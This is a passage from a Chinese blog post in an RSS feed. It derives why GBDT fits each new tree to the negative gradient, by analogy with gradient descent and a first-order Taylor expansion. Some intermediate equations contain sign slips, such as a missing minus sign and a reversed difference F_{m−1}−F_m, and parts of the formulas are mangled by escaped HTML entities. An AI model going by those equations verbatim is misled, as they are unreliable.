$$f(\theta_{t})-f(\theta_{t-1})=\eta ef&amp;rsquo;(\theta_{t-1})&amp;lt;0$$
在不考虑标量$\eta$时，要使$ef&amp;rsquo;(\theta_t)$最小，则需要让单位向量$e$和导数的方向相反，那么则有
$$e=-\frac{f&amp;rsquo;(\theta_{t-1})}{||f&amp;rsquo;(\theta_{t-1})||}$$
其中分母因为是标量，可以并入到$\eta$中，则有
$\theta_{t}-\theta_{t-1}=\eta f&amp;rsquo;(\theta_{t-1})$
即
$$\theta_{t}=\theta_{t-1}-\eta\frac{\partial f(\theta_{}t-1)}{\partial \theta_{t-1}}$$
GBDT 现在考虑GBDT里的情况。在梯度下降法中，我们的目的是为了在参数空间中找到一个参数，使得损失函数最小；而在GBDT中，我们的目的是为了在函数空间（也就是所有可能的树序列组成的空间）中，找到一个函数（某一个树序列）使得损失函数（“标签”与“树序列输出之和”的差异）最小。所以我们可以把GBDT和梯度下降做一个类比。
$f(\theta_{t})$可以类比为加入当前树之后的损失函数$l(y_i,\hat{y}i^{t-1}+T_t(x))$ ，$f(\theta{t-1})$类比为之前的损失函数$l(y_i,\hat{y}i^{t-1})$，那么梯度下降中的参数$\theta$就可以类比为GBDT中累加的学习器$F_m$,$\theta{t}$和$\theta_{t-1}$分别类比为加入当前树和没加入当前树的两个学习器$F_m(x)$和$F_{m-1}(x)$，且有
$$F_{m-1}(x)-F_m(x)=T_t(x)$$
这次我们从泰勒展开的角度来讲，关于$\hat{y}_i^{t-1}$的函数$l(y_i,\hat{y}_i^{t-1}+T_t(x))$在$T_t(x)$处的泰勒一阶展开为：
$$l(y_i,\hat{y}_i^{t-1}+T_t(x))=l(y_i,\hat{y}i^{t-1})+(F{m-1}(x)-F_m(x))\frac{\partial l(y_i,\hat{y}_i^{t-1}+T_t(x))}{\partial \hat{y}_i^{t-1}}$$
这个式子其实也可以类比上一节中的式子：
$$f(\theta_{t})-f(\theta_{t-1})=(\theta_{t}-\theta_{t-1})f&amp;rsquo;(\theta_{t-1})$$
其实二者是一样的形式，所以我们也可以把最终梯度下降的表达式改写成GBDT的形式，有兴趣的话可以自己推一遍，其实形式上是一样的，只是换了个空间而已。
$$F_{m}=F_{m-1}-\eta\frac{\partial l(y_i,\hat{y}_i^{t-1}+T_t(x))}{\partial \hat{y}_i^{t-1}}$$
即
$$T_t(x)=-\eta\frac{\partial l(y_i,\hat{y}_i^{t-1}+T_t(x))}{\partial \hat{y}_i^{t-1}}$$
这也就是为什么我们要让新的树去拟合负梯度了。
Ending 这么一总结，大胆猜测XGBoost使用了泰勒二阶展开，可能就是受了GBDT中使用一阶展开的启发。终于把很多博客都没有说的很清楚的部分记录下来了，当然这里也参考了一些写的很棒的博客和知乎回答，感谢大家的辛勤付出！
参考资料 梯度下降法的推导
gbdt的残差为什么用负梯度代替？ - 奥奥奥奥噢利的回答 - 知乎</description>
    </item>
    
  </channel>
</rss>
